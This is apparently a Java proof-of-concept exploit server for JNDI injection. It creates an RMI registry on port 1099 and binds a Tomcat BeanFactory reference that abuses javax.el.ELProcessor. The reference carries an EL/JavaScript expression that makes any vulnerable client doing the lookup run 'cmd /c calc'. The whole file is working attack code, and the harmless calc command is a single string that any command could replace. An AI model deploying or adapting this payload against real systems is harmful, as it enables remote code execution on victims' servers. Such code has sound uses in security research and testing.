package org.vul;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIRegistryServer {
    public static void main(String[] args) throws Exception {
        ResourceRef refObj = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        refObj.add(new StringRefAddr("forceString", "x=eval"));
        String cmd = "calc";
        refObj.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','"+ cmd +"']).start()\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(refObj);

        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("refObj", referenceWrapper);
    }
}